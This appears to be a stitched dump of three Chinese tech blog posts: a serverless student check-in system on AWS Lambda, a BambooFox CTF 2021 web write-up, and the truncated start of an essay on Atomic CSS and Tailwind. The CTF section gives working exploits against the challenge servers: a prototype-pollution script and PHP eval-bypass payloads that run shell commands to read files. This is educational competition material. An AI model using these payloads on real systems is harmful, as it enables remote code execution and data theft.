而在進行這些教學實驗的時候，我常常在想可以透過哪些現成的服務減少我的負擔，畢竟身為工程師嘛，很想把一些瑣碎的事務自動化，長期下來可以節省的時間是很可觀的。 半年前有了第一次嘗試，也在這邊分享了心得：利用 Github Classroom 加 Travis CI 打造改作業系統，有了自動改作業系統以後，確實省下不少麻煩。 這次要來分享的是兩週前用大概一兩天的時間快速實作出來的自動化簽到系統。 為什麼要簽到系統？為了掌握學生的進度以及確保學生是真的有心要持續上課，我在上一次教學實驗時就引進了我在公司裡面每天必做的 Daily Stand-up meeting，每個人快速分享一下自己昨天做了什麼、今天要做什麼以及有沒有任何事情阻止你完成這些任務。 那時候我用的方法是讓每個人在 Slack 的 channel 裡面用固定格式 po 這些東西： 優點是集中在一個地方，很方便觀看，而缺點就是我只能用肉眼看而已，沒辦法記錄下來。意思就是說如果我想要製作一個有哪些學生沒有 po 的表單，我只能一個一個自己填。 上一次時因為學生人數少，而且 po 這個也不是強制的，所以不成問題，但在這一次的教學實驗裡面我引入了淘汰制，在一定期間內如果缺交進度報告太多次是會被淘汰退出課程的。 既然有了這個機制，我就必須要把這些進度報告給記錄起來，要記錄哪些人哪些日子是沒有報告的。如此一來，就必須要有一個更完整的簽到系統才行，我想達成的目的有： 我要可以在 slack channel 裡面看見每個人的進度報告 我要有個地方可以記錄每天每個學生有沒有 po 進度報告（就把這個稱作簽到） 該如何製作這個簽到系統？我的第一個想法就是使用 Google 試算表，畢竟這個東西最方便嘛，橫軸填入每個學生的帳號，縱軸填入每天的日期，如果有報告就給一個記號，沒報告就空白，這樣我就可以很明確地看出簽到紀錄了，成品長得像這樣： 這樣子就完成第二個需求了，剩下來的就是想說如何完成第一個需求。最簡單的方式就是跟之前一樣，讓學生在某個 channel 裡面每天自己 po 就好，然後我寫個程式來串 Slack 的 webhook，接收到資料就寫進 Google 試算表裡面。 這個解決方案看似不錯，可是有個問題是課程用的 workspace 是免費版的，訊息到一定量之後就會被吃掉，就看不到以前的進度報告，我覺得這是有點可惜的，所以這個方案行不通。 接著我就想到另一個更不錯的解決方案： 讓學生在 GitHub 的 Issue 下面留言 留言同步到 Slack channel 串接 GitHub Webhook，同步把紀錄寫到試算表裡面 這樣子的好處就是紀錄可以永久保存，而且還可以分天！可以很容易的就找到某一天所有人的進度報告，這個是直接 po 在 Slack 裡沒辦法做到的。 先給大家看一下成品，成品長得會像這樣： 有了對整個簽到系統的概念以後，接下來我們可以把在技術上要做的事情分成以下三項： 每天要在 GitHub 開一個 Issue，標題是今天的日期 每個 Issue 下的留言要被同步到 Slack 要串接 GitHub Webhook，同步把紀錄寫到試算表裡面 再來就是實作時間了！ 1. 每天要在 GitHub 開一個 Issue，標題是今天的日期一看到「每天」這個關鍵字，就知道這是 Cron Job 可以搞定的事情，原本我想在自己的機器上寫個簡單的小程式讓它每天跑，可是我腦海中突然冒出一個關鍵字：AWS Lambda。 如果你還不知道這是什麼，我簡單說一下，這是近年很流行的 Serverless 的概念之一，不是說沒有 Server，而是指說你不用自己去管 Server，你唯一要做的就是把你的 application 寫好，剩下那些跟 Server 跟機器有關的事情你都不用管。 而 AWS Lambda 就是這樣的一個服務，你只要把你的程式碼放上去就好了，剩下的你都不用管，計費方式是程式的執行時間，可能是因為還在推廣期的關係，所以一個月在一定時數以內都不用錢。 如果不用 Lambda，我要自己把東西傳到我的 Server，然後自己設定 Cron Job 來跑，如果主機出了什麼事情還要自己來修，可是我想做的就只是這麼簡單的一件事情而已阿！用 Lambda 可以幫我省掉很多麻煩，絕對是最佳選擇。 確定要放在 Lambda 上之後，就是要按照它的要求把程式碼寫好放上去，其實這要求也很簡單啦，就是把你要執行的 function 用 exports.handler 給 export 出去就好。 下面是寫好的程式碼： var axios = require('axios') var moment = require('moment') var token = process.env.token var endpoint = 'https://api.github.com/repos/Lidemy/mentor-daily-report/issues?access_token=' + token var today = moment().format('YYYY-MM-DD') var content = [ '在下面請按照此格式提供本日進度報告：', '```', '## 昨天', '- 寫作業 hw2-1', '- 練習 JavaScript 迴圈使用', '## 今天', '- 研究什麼是 callback', '- 寫作業 hw2-1（繼續）', '```' ].join('\\n') const createIssue = async (event) => &#123; try &#123; const result = await axios.post(endpoint, &#123; title: '[進度報告] ' + today, body: content &#125;, &#123; headers: &#123; 'Accept': 'application/vnd.github.v3+json' &#125; &#125;) return 'success' &#125; catch (err) &#123; return err; &#125; &#125; exports.handler = createIssue 一個非常簡單的程式，一執行就會透過 GitHub API 去 po 一個新的 Issue，標題就是今天的日期。 有一點需要注意的是這邊有用到其他 npm 的 library，應該有方法是可以只傳 package.json 上去，Lambda 就幫你執行 npm install 把那些套件抓下來，但我懶得查了，我就直接把node_modules包進壓縮檔裡面丟上去。 我上一次用 Lambda 大概兩三年前，這個服務才剛推出沒多久，因為好奇所以隨意玩了一下，發現介面很陽春然後很多東西不知道怎麼設定。 事隔多年，這次再看到它的介面真的嚇到我了，進步超級多！ 首先是觸發條件這個部分一目瞭然： 因為我是要每天固定執行，在 AWS 上你可以用 CloudWatch 來設定一個排程，要注意的是在 Lambda 上面這個排程的時間會以 UTC 為準，也就是 +0 的時區，所以你如果是寫說每天 00:00 跑，其實就代表說是在台灣的早上 08:00 跑。 我這邊設定的表達式是：5 0 ? * MON-FRI *，在台灣時間平日早上 08:05 都會觸發 Lambda，執行 po issue 的 function。 然後在 Lambda 的介面上如果你的程式碼沒有很大，可以直接編輯，有功能完整的編輯器（我一直覺得很眼熟，後來才想到應該是 Amazon 買了 Cloud9 的關係，以前上 CS50 都用 Cloud9 的 IDE，難怪這麼熟悉）： 最後把環境變數 token 設定好之後就完成了，測試一下發現 Issue 有成功被建立，第一個任務就這樣輕鬆完成了，感謝 Lambda 的努力。 2. 每個 Issue 下的留言要被同步到 Slack這是三個任務當中最簡單的，因為 Slack 本來的優勢就是可以跟很多現成的東西串接，只要在 Slack 上面安裝 GitHub App，就可以用指令來 subscribe 指定的 repo 跟事件。 因為這個實在是太簡單，所以我就沒必要再多介紹了，直接給大家看成果： 3. 要串接 GitHub Webhook，同步把紀錄寫到試算表裡面這個任務我們一樣用 Lambda 搭配其他 AWS 的服務就可以輕鬆實作出來，流程是這樣的： 學生留言，觸發 GitHub Webhook GitHub Webhook 打到 AWS API Gateway 經由 API Gateway 觸發 Labmda function Lambda function 透過 Google Sheet API 寫入試算表 我們先來把要丟給 webhook 的 API 給準備好，這邊利用 API Gateway 來觸發 Lambda，像是這樣： API Gateway 設定上也超級方便，你就設定要用什麼 HTTP method，他就會給你一個網址，假設我設定的是 GET，那你用 GET 打這個 API 它就會觸發 Lambda，用超短的時間就能做出一個 Webhook，比起自己架 Server 還要設定 domain 跟 https 方便得多。 再來就是要串接 Google Sheet API 了，我稍微看了一下官方的 API 發現還是維持一慣的風格，就是文件很完整但是講得很複雜，沒辦法一眼就看出我到底要怎麼實作出我要的功能，後來就找了一套別人包裝過的：Simple Google Spreadsheet Access (node.js)，用起來簡單很多。 最麻煩的權限管理裡面也有教你怎麼實作，基本上就是去開一個Service Account，設定成對 Google Drive API 有權限，然後再去產生這個帳號的 token，用那一組 token 就行了。 主程式要做的基本上就是先過濾資料，接著從 GitHub 丟過來的資料裡找到帳號，把帳號跟日期丟進我另外寫好的 function，最後回傳結果就結束了： var updateSheet = require('./lib') exports.handler = async (event, context, callback) => &#123; if (!event.body) return 'no body' const body = JSON.parse(event.body) || &#123;&#125; if (!body || body.action !== 'created') return response(callback) const title = body.issue.title.split(' ') if (!title.length) return response(callback) const date = title[1] const account = body.comment.user.login console.log('log:', date, account) try &#123; await updateSheet(date, account) return callback(null, &#123; statusCode: 200, body: date + account &#125;) &#125; catch (err) &#123; console.log('error:', err) &#125; return response(callback) &#125;; const response = (cb) => &#123; cb(null, &#123; statusCode: 200, body: 'ok' &#125;) &#125; updateSheet 這個 function 做的事也很簡單，就是根據日期還有帳號找到正確的位置，把那一格的值更改成 O 就好了，這邊附上部分程式碼供大家參考： async function searchAccount(sheet, account) &#123; const firstRow = await getCells(sheet, &#123; 'min-row': 1, 'max-row': 1 &#125;) const length = firstRow.length for(var i=0; i&lt;length; i++) &#123; if (firstRow[i].value === account) &#123; return &#123; col: firstRow[i].col, batchId: firstRow[i].batchId &#125; &#125; &#125; return null &#125; async function setValue(sheet, row, col, value) &#123; const cells = await getCells(sheet, &#123; 'min-row': row, 'max-row': row, 'min-col': col, 'max-col': col, 'return-empty': true &#125;) if (cells &amp;&amp; cells[0]) &#123; cells[0].value = value cells[0].save(function(err) &#123; if (err) &#123; console.log('err', err) &#125; &#125;) &#125; &#125; async function updateSheet(date, account) &#123; try &#123; const sheet = await getSheet() const accountPosition = await searchAccount(sheet, account) const datePosition = await searchDate(sheet, date) console.log('position:', accountPosition, datePosition) if (!accountPosition || !datePosition) return await setValue(sheet, datePosition.row, accountPosition.col, 'O') &#125; catch (err) &#123; console.log('err', err) &#125; &#125; 最後只要在 GitHub 那邊把 webhook 的網址設定好，一切就大功告成了！ 在 Lambda 上要如何 debug？雖然我上面寫的輕鬆寫意，但實際開發的時候我其實有碰到幾個小問題，第一個就是 debug 不像你在電腦上那樣可以直接看到結果，而且 webhook 通常又是比較難 debug 的一個。 有關於這部分，其實 Lambda 都會把 log 送到 CloudWatch 去，所以就是自己在 app 裡面寫 log，再去看 CloudWatch 分析一下那些 log，如果是簡單的應用的話還滿容易的，再複雜一點的話應該就是 function 要切更細，不然 debug 起來應該滿麻煩的。 另一個碰到的問題是 Google Sheet API 那邊速度比較慢，整個過程做完大概要 5 秒左右，預設的 timeout 好像是 3 秒左右，記得要自己把 timeout 加大不然會一直失敗。 總結這次對於 AWS Lambda 的使用體驗滿不錯的，開發過程中沒碰到什麼太大的困難，可能跟我想實作的東西比較簡單也有關係，但這種簡單的東西我覺得超級適合走這種 Serverless 的方案，因為沒有 Server 真的超方便的，少了很多麻煩。 以後如果還有類似簡單的小需求，我想我應該還是會走這種解決方案，直接用現成服務一個串一個，把東西全部串起來就結束了。也推薦大家如果要做一些小東西，不妨來試試看用這些現成的服務搞定，可以節省很多時間。","link":"/2018/09/14/aws-lambda-and-github-api/"},{"title":"BambooFox CTF 2021 writeup","text":"前言最近的興趣是玩 CTF，而且只玩裡面的 web 題，原因很簡單，因為其他領域的我都不會…目前只對 web 的東西比較有興趣，就當作休閒娛樂來解題了。 這篇是 BambooFox CTF 2021 的解題心得，只解出了三題。 Time to Draw是一個畫圖然後會即時同步的網站，有附上 source code： const express = require(\"express\"); const cookieParser = require('cookie-parser') var crypto = require('crypto'); const secret = require(\"./secret\"); const app = express(); app.use(cookieParser(secret.FLAG)); let canvas = &#123; ...Array(128).fill(null).map(() => new Array(128).fill(\"#FFFFFF\")) &#125;; const hash = (token) => crypto.createHash('sha256').update(token).digest('hex'); app.get('/', (req, res) => &#123; if (!req.signedCookies.user) res.cookie('user', &#123; admin: false &#125;, &#123; signed: true &#125;); res.sendFile(__dirname + \"/index.html\"); &#125;); app.get('/source', (_, res) => &#123; res.sendFile(__filename); &#125;); app.get('/api/canvas', (_, res) => &#123; res.json(canvas); &#125;); app.get('/api/draw', (req, res) => &#123; let &#123; x, y, color &#125; = req.query; if (x &amp;&amp; y &amp;&amp; color) canvas[x][y] = color.toString(); res.json(canvas); &#125;); app.get('/promote', (req, res) => &#123; if (req.query.yo_i_want_to_be === 'admin') res.cookie('user', &#123; admin: true &#125;, &#123; signed: true &#125;); res.send('Great, you are admin now. &lt;a href=\"/\">[Keep Drawing]&lt;/a>'); &#125;); app.get('/flag', (req, res) => &#123; let userData = &#123; isGuest: true &#125;; if (req.signedCookies.user &amp;&amp; req.signedCookies.user.admin === true) &#123; userData.isGuest = false; userData.isAdmin = req.cookies.admin; userData.token = secret.ADMIN_TOKEN; &#125; if (req.query.token &amp;&amp; req.query.token.match(/[0-9a-f]&#123;16&#125;/) &amp;&amp; hash(`$&#123;req.connection.remoteAddress&#125;$&#123;req.query.token&#125;`) === userData.token) res.send(secret.FLAG); else res.send(\"NO\"); &#125;); app.listen(3000, \"0.0.0.0\"); 因為最近才解了一題 prototype pollution 的題目，所以一眼就看到：if (x &amp;&amp; y &amp;&amp; color) canvas[x][y] = color.toString(); 跟最後一段的判斷： if (req.query.token &amp;&amp; req.query.token.match(/[0-9a-f]&#123;16&#125;/) &amp;&amp; hash(`$&#123;req.connection.remoteAddress&#125;$&#123;req.query.token&#125;`) === userData.token) res.send(secret.FLAG); else res.send(\"NO\"); 只要透過原型污染就可以讓 userData.token 可控，接下來只要找到正確的值就行了。 最後的解法長這樣： var axios = require('axios') var crypto = require('crypto') var baseUrl = 'http://chall.ctf.bamboofox.tw:8787' var myip = '1.1.1.1' const hash = (token) => crypto.createHash('sha256').update(token).digest('hex'); const token = '5555555555555555' const hashValue = hash(`$&#123;myip&#125;$&#123;token&#125;`) async function run() &#123; await axios.get(baseUrl + '/api/draw?x=__proto__&amp;y=token&amp;color=' + hashValue) const response = await axios.get(baseUrl + '/flag?token=' + token) console.log(response.data) &#125; run() 讓 x &#x3D; __proto__，y &#x3D; token，所以就會變成：canvas[&#39;__proto__&#39;][&#39;token&#39;] = xxx，達成 prototype pollution。 ヽ(#&#96;Д´)ﾉ這一題給的程式碼非常簡短： &lt;?= highlight_file(__FILE__) &amp;&amp; strlen($🐱=$_GET['ヽ(#`Д´)ﾉ'])&lt;0x0A &amp;&amp; !preg_match('/[a-z0-9`]/i',$🐱) &amp;&amp; eval(print_r($🐱,1)); 限制看起來很嚴格，長度最多只能到 9，而且還不能有任何英文數字。 之前有解過類似的需要用 xor 或是 not 來產生字元，然後再用 PHP 可以用字串 function 名稱執行函式的特性來執行，最後達成 RCE。 不過這題的長度限制是 9，再怎麼想都不可能，因為光是基本的一些字元就已經超過了。 所以這題換個角度想，可以用 array 來試試看，自己實際試過之後發現 array 確實可以繞過，前面兩個判斷都可以通過，那接下來的問題就是該怎麼讓：eval(print_r($🐱,1) 可以順利執行。 這邊我一開始的想法是讓 print_r 出來的東西變成合法的 php 程式碼，就可以成功執行了，於是我先用 print_r 出來的格式去跑 php，嘗試過底下這樣： &lt;?php $arr = array( [0] => 1 ); print_r($arr); ?> 執行之後會輸出：PHP Fatal error: Illegal offset type in &#x2F;Users&#x2F;li.hu&#x2F;Documents&#x2F;playground&#x2F;php-test&#x2F;er.php on line 3 看起來是 array 的 index 不能是陣列，不然就會出錯。原本想說那這條路應該行不通了，後來我想說：「那既然會出錯，有沒有可能在出錯之前先執行我想執行的函式？」，就嘗試了以下程式碼： &lt;?php $arr = array( [0] => system(\"ls\") ); print_r($arr); ?> 發現還真的印出結果了！而且原本的 fatal error 變成了 warning：Warning: Illegal offset type in &#x2F;Users&#x2F;huli&#x2F;Documents&#x2F;security&#x2F;ais&#x2F;php-challenge&#x2F;b.php on line 3 我到現在還是不知道為什麼，但只要 value 的部分有 function call 就會這樣。 所以只要讓 print_r 產生出來的東西變成一段合法程式碼，就可以插入任意字元，後半段用 /* 註解掉就好，最後的解法長這樣： abs(1)); echo shell_exec(\"cat /*\"); /* 先用 abs(1) 把 fatal error 變 warning，然後執行想要的程式碼，最後用註解把後面跳掉，成功拿到 flag。 賽後去看其他人的解法，發現 query string 原來這麼神奇。我一直以為 query string 頂多就是傳 array，像是這樣：?a[]=1&amp;a[]=2，但後來才發現原來[]裡面可以有東西，像這樣：?a[test]=1，在 PHP 裡面你就可以拿到： Array ( [test] => 1 ) 如果是這樣的話，就可以讓 key 是 /*，value 是 */]); echo 123;/*，組合起來就變成： &lt;?php Array( [/*] => \"*/]); echo 123;/*\" ); ?> 就成功組出一段合法的 PHP 程式碼。 這一題學到最有價值的東西就是這個了，原來 query string 不只傳陣列，要傳物件也是可以的（至少 PHP 跟 express 都有支援，其他的我不確定） calc.exe online一個計算機的程式，程式碼如下： &lt;?php error_reporting(0); isset($_GET['source']) &amp;&amp; die(highlight_file(__FILE__)); function is_safe($query) &#123; $query = strtolower($query); preg_match_all(\"/([a-z_]+)/\", $query, $words); $words = $words[0]; $good = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh', 'ncr', 'npr', 'number_format']; $accept_chars = '_abcdefghijklmnopqrstuvwxyz0123456789.!^&amp;|+-*/%()[],'; $accept_chars = str_split($accept_chars); $bad = ''; for ($i = 0; $i &lt; count($words); $i++) &#123; if (strlen($words[$i]) &amp;&amp; array_search($words[$i], $good) === false) &#123; $bad .= $words[$i] . \" \"; &#125; &#125; for ($i = 0; $i &lt; strlen($query); $i++) &#123; if (array_search($query[$i], $accept_chars) === false) &#123; $bad .= $query[$i] . \" \"; &#125; &#125; return $bad; &#125; function safe_eval($code) &#123; if (strlen($code) > 1024) return \"Expression too long.\"; $code = strtolower($code); $bad = is_safe($code); $res = ''; if (strlen(str_replace(' ', '', $bad))) $res = \"I don't like this: \" . $bad; else eval('$res=' . $code . \";\"); return $res; &#125; ?> &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"> &lt;link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bulma@0.9.1/css/bulma.min.css\"> &lt;script defer src=\"https://use.fontawesome.com/releases/v5.3.1/js/all.js\">&lt;/script> &lt;title>Calc.exe online&lt;/title> &lt;/head> &lt;style> &lt;/style> &lt;body> &lt;section class=\"hero\"> &lt;div class=\"container\"> &lt;div class=\"hero-body\"> &lt;h1 class=\"title\">Calc.exe Online&lt;/h1> &lt;/div> &lt;/div> &lt;/section> &lt;div class=\"container\" style=\"margin-top: 3em; margin-bottom: 3em;\"> &lt;div class=\"columns is-centered\"> &lt;div class=\"column is-8-tablet is-8-desktop is-5-widescreen\"> &lt;form> &lt;div class=\"field\"> &lt;div class=\"control\"> &lt;input class=\"input is-large\" placeholder=\"1+1\" type=\"text\" name=\"expression\" value=\"&lt;?= $_GET['expression'] ?? '' ?>\" /> &lt;/div> &lt;/div> &lt;/form> &lt;/div> &lt;/div> &lt;div class=\"columns is-centered\"> &lt;?php if (isset($_GET['expression'])) : ?> &lt;div class=\"card column is-8-tablet is-8-desktop is-5-widescreen\"> &lt;div class=\"card-content\"> = &lt;?= @safe_eval($_GET['expression']) ?> &lt;/div> &lt;/div> &lt;?php endif ?> &lt;a href=\"/?source\">&lt;/a> &lt;/div> &lt;/div> &lt;/body> &lt;/html> 簡單來說就是針對字串進行過濾，連續的英文字必須要出現在設定好的名單裡面才行，仔細一看會發現都是跟 math 有關的 function。 除此之外也不能有不合法的字元，例如說 $，否則就會失敗。 這一題滿多人解出來的，但我一開始看到的時候沒什麼頭緒，只覺得應該會滿麻煩的。睡了一覺醒來之後再看了一次那個 function 的清單，看到了 base_convert，是進制轉換的。 回想起之前寫的 如何不用英文字母與數字寫出 console.log(1)？ 那篇，其實就有講過可以透過進制轉換來產生出任意字元。 PHP 可以這樣執行程式碼： &lt;?php (\"system\")(\"ls /\"); ?> 所以只要能湊出 system 跟要執行的指令這兩個字串，這題就搞定了。 但要注意的是指令中會有空白跟 &#x2F; 這些不能用進制轉換的字元，這怎麼辦呢？可以先湊出 chr，再用 chr 搭配 ascii code 就行了，就能產生任意字元。 最後的 payload 是這樣，組出 exec 跟 chr 然後組出指令： (base_convert(14, 10, 36).base_convert(33, 10, 36).base_convert(14, 10, 36).base_convert(12,10,36))(base_convert(12, 10, 36).base_convert(10, 10, 36).base_convert(29, 10, 36).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(32).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(47).(base_convert(12,10,36).base_convert(17,10,36).base_convert(27,10,36))(42)) 話說我是手動組的，但我下次覺得應該要寫個程式才對… 總結這次就解了這三題，因為是當作休閒娛樂所以也沒什麼壓力，看題目看一看沒想法就去做其他事，隔一段時間再回來繼續解。 比較遺憾的是另外兩題 web 都沒有解掉，其中一題是要利用特殊字元繞過檢查，可以用像是 domain-obfuscator 的工具去嘗試，這也是值得去研究的一個議題，滿有趣的。 另外一題則是 SQL injection 搭配其他技巧，當初在解的時候稍微嘗試一下，沒找到什麼然後對這個主題也不是這麼熟悉，就沒有再繼續下去了。 總之呢，解 CTF 的題目還是相當有趣的，感謝主辦單位以及出題者們。","link":"/2021/01/24/bamboofox-ctf-2021-writeup/"},{"title":"淺談 Atomic CSS 的發展背景與 Tailwind CSS","text":"這陣子在 Front-End Developers Taiwan 臉書社團上有一系列關於 Tailwind CSS 的討論，起因是另一篇已經刪除的貼文，那篇貼文我有看過，因為怕原文內容跟記憶內容有落差，因此這邊就不講我記憶中的原文大概是在寫什麼了，畢竟這也不是這篇所關注的重點。 總之呢，那篇貼文引起了臉書上前端社團的熱烈討論，在短短兩三天內迅速多出許多討論相關技術的文章。 而有許多人在討論的議題，其實比起 Tailwind CSS 這個工具，更多的是在討論 Atomic CSS 這個概念本身。 Atomic CSS 這個詞由 Thierry Koblentz 所提出，最早出自於這篇 2013 年發表的必讀的經典：Challenging CSS Best Practices。 那什麼是 Atomic CSS？這邊直接取用 Let’s Define Exactly What Atomic CSS is 這篇文章給的定義： Atomic CSS is the approach to CSS architecture that favors small, single-purpose classes with names based on visual function. 例如說像這樣子的東西就是 Atomic CSS： .bg-blue &#123;background-color: #357edd; &#125; .margin-0 &#123; margin: 0; &#125; 而 Tailwind CSS 就是實作了 Atomic CSS 這個概念的一個 CSS 框架。 在 2019 年的時候我也寫過一篇在講 Atomic CSS 的文章，但那時用的是另外一個同義詞叫做 Functional CSS：邪魔歪道還是苦口良藥？Functional CSS 經驗分享，在那篇裡面已經有提到一些這篇想講的東西，但我覺得還不夠完整，因此才又寫了一篇。 在這篇文章中，我希望跟大家一起讀一下這些經典文章，因為你會發現有些爭論的點可能早在八九年前就已經被提出、討論或甚至是解決了。接著就可以來看看最早的 Atomic CSS 跟現在的 Tailwind CSS 的差別在哪，優缺點又是什麼？ 大綱如下： Atomic CSS 的誕生背景 Atomic CSS 到底想解決什麼問題？ 針對 Atomic CSS 的問題與反駁 我對 Atomic CSS 的看法 Tailwind CSS 改良了哪些部分？ 結語 Atomic CSS 的誕生背景如開頭所述，Atomic CSS 一詞出自於 Yahoo! 的工程師 Thierry Koblentz（以下簡稱 TK）在 2013 年所發表的 Challenging CSS Best Practices。 在看這篇文章之前，我們可以先看一下 2022 年 2 月的這篇專訪：The Making of Atomic CSS: An Interview With Thierry Koblentz，在這篇裡面提及了更多 Atomic CSS 出現的背景以及早期在 Yahoo! 內部的應用。 根據文章中的說法，有天他的主管來問他有沒有一種可以不改到 stylesheet 但還是可以動到畫面的方法，因為他想避免把東西改壞。 於是 TK 就做了一個「utility-sheet」，讓工程師可以在不改到 stylesheet 的狀況下依然能改到前端的樣式。聽起來這個 utility-sheet 應該就是一個靜態的 CSS 檔案，然後裡面有著各種 utility class。 接著過了幾年，一個工程主管問他是否能「全部都用 utility class」來改寫 Yahoo! 的首頁，在當時可以說是先驅中的先驅了。 最後他們寫了一個純靜態（static）的 CSS 並取名為 Stencil 來完成這件事（這邊會講到純靜態是為了跟等一下會出現的東西來做對比），並且從中發現了很多這樣子使用的好處。 這套純靜態的 CSS 的特色之一是可以強迫遵從一些 design style，例如說只寫了 margin-left-1、margin-left-2、margin-left-3 之類的 class，然後每一個對應到的是 x4，因此你的 margin 就只有 4px、8px 跟 12px 這些 4 的倍數可以用，利用這個來強迫設計遵循既有的規則。 不過後來他們發現這套系統行不通。因為在現實世界中，每個 design team 都有自己不同的要求，他們想要的 padding、margin、字體、顏色全部都不同，所以靜態是不行的，需要客製化，需要動態產生。 於是 Atomizer 就誕生了，一個幫你產生相對應 CSS 檔案的工具。 例如說你有個頁面寫了： &lt;div class=\"D(b) Va(t) Fz(20px)\">Hello World!&lt;/div> Atomizer 就會自動幫你產生底下的 CSS 出來： .D(b) &#123; display: block; &#125; .Va(t) &#123; vertical-align: top; &#125; .Fz(20px) &#123; font-size: 20px; &#125; 如此一來，工程師們就可以有更大的彈性去符合設計的需求。 上面看到的這些語法叫做 ACSS，其實功能基本上跟現在的 Tailwind CSS 已經滿類似的了，只是使用的語法不太一樣而已。這套 ACSS 系統的命名規則的靈感是來自於 Emmet，一個可以利用語法幫你快速建置 HTML 的套件，而 class name 中的 () 的靈感則是來自於函式呼叫。 接著 TK 談到了在像是 Yahoo! 這種大型企業寫 CSS 跟其他地方有什麼不同，你會面臨到的狀況超級複雜，包括跨國跨時區的溝通、分佈各地的團隊成員、幾百個共用的 component、l10n 跟 i18n、一堆 legacy code，以及一堆的辦公室政治。 在需要維護一個超級複雜的專案的狀況之下，他開始反思一些常見做法（common practice）是否真的能帶來益處，最後卻發現有些概念除了沒有帶來益處以外，甚至是有害的。 在複雜的專案之中，有很多你可能沒想過的狀況會發生，所以維護變得很艱難，必須要小心翼翼去避開一些陷阱。 另外，在內部推廣 ACSS 的旅程剛開始並不順利，看起來有許多 team 都對那樣的語法卻步（我猜就如同我在之前的文章寫的一樣，一開始看到都會覺得這是什麼邪魔歪道），但是 ACSS 帶來的好處反映在數據上面，採用了 ACSS 的專案少了大約 36% 的 CSS 與 HTML 的大小，因此至今依然有許多專案還用著 ACSS。 如果你把 A 網頁的 HTML 複製，貼上到 B 網頁去，你會發現 UI 完全沒變，使用了 ACSS 之後不會因為你在別的頁面就有不同的樣式，這就是 ACSS 所帶來的好處，原文是這樣寫的： This is because ACSS makes these components page agnostic. 「page agnostic」是我覺得很重要的一個性質，這個之後會再提到。 原文的專訪還有提到更多故事背景跟挑戰，不過在這邊我就不繼續再提了，有興趣的讀者們可以去看原文。而之前 TechBridge 的好夥伴 Arvin 以前在 Yahoo! 待過，在公司內有寫過 ACSS，他在 2017 年的時候有寫過一篇文章，也很值得一看：淺談 CSS 方法論與 Atomic CSS。 這篇專訪中其實對於 Atomic CSS 想解決的問題並沒有到這麼多的著墨，不過從中可以看見 TK 在工作上需要維護大型的專案，因此自然也會碰到許多痛點，不難想像出 Atomic CSS 誕生的背景也與此有關。 想知道 Atomic CSS 要解決什麼問題，就要來看經典之作了。 Atomic CSS 到底想解決什麼問題？底下我會引用許多來自於 Challenging CSS Best Practices 的內容，因為原文寫得很清楚。如果英文閱讀能力 ok 的話，也強烈推薦讀者們自己看過一遍。 在文章開頭的 quick summary，就有這樣一段： When it comes to CSS, I believe that the sacred principle of “separation of concerns” (SoC) has lead us to accept bloat, obsolescence, redundancy, poor caching and more. Now, I’m convinced that the only way to improve how we author style sheets is by moving away from this principle. 大家都知道在寫網頁的時候要注重關注點分離（separation of concerns），讓 HTML 做好它的事情，只關注內容，而 CSS 只關注樣式，兩者透過 class name 連結在一起。可是作者發現這樣子的概念，其實會帶來許多負面影響，因此這篇文章就是來說服大家不要再把這種做法奉為信條，如果有更好的路，那幹嘛執著在這呢？ 接著文中舉了一個簡單的例子，稱之為 media object，HTML 長這樣： &lt;div class=\"media\"> &lt;a href=\"https://twitter.com/thierrykoblentz\" class=\"img\"> &lt;img src=\"thierry.jpg\" alt=\"me\" width=\"40\" /> &lt;/a> &lt;div class=\"bd\"> @thierrykoblentz 14 minutes ago &lt;/div> &lt;/div> CSS 長這樣： media &#123; margin: 10px; &#125; .media, .bd &#123; overflow: hidden; _overflow: visible; zoom: 1; &#125; .media .img &#123; float: left; margin-right: 10px; &#125; .media .img img &#123; display: block; &#125; 最後呈現出來的結果如下： 接著第一個需求來了，有些地方需要把圖片顯示在右邊而不是左邊，於是我們可以在 HTML 的元素上增加新的 class imgExt，並且新增底下的 CSS： .media .imgExt &#123; float: right; margin-left: 10px; &#125; 然後第二個需求來了，當這一塊內容出現在某個右側區塊（原文為 right rail）時，文字要變小。於是我們可以包一個 div 在外面，像這樣： &lt;div id=\"rightRail\"> &lt;div class=\"media\"> &lt;a href=\"https://twitter.com/thierrykoblentz\" class=\"img\"> &lt;img src=\"thierry.jpg\" alt=\"me\" width=\"40\" /> &lt;/a> &lt;div class=\"bd\"> @thierrykoblentz 14 minutes ago &lt;/div> &lt;/div> &lt;/div> 然後針對這個 #rightRail 去調整樣式，調整完的全部樣式如下： media &#123; margin: 10px; &#125; .media, .bd &#123; overflow: hidden; _overflow: visible; zoom: 1; &#125; .media .img &#123; float: left; margin-right: 10px; &#125; .media .img img &#123; display: block; &#125; .media .imgExt &#123; float: right; margin-left: 10px; &#125; #rightRail .bd &#123; font-size: smaller; &#125; 這些調整樣式的方法應該都滿直覺的，但作者點出其實有幾個問題： 每次 UI 要支援不同的樣子，就要新增一個 CSS rule .media 跟 .bg 共用同樣的樣式，如果還有別的要共用，CSS selector 就會越來越多，越來越大 在最後的六個 CSS selector 中，有四個是基於 context 的，不好維護也不好重用 RTL（Right To Left）跟 LTR（Left To Right）會變得很複雜 第一點其實乍看之下滿正常，你要在不同狀況支援不同的樣子，不就一定要寫新的 CSS 規則嗎？但作者卻說有更好的方法來處理，不一定要新增。 第二點其實看起來也滿正常，要共用 style 的話，寫成 .media, .bg 不是很常見嗎？檔案大的話也是必然的吧？ 第三點的話這個 context 是個很重要的概念，例如說我們最後這個規則：#rightRail .bd，讓在 #rightRail 底下的 .bd 改變字體大小，有不同的樣式。 所以我們的 media object 會根據 context（是否在 #rightRail） 底下有不同的樣式，就寫了不同的 CSS 規則去處理。 一旦讓你的 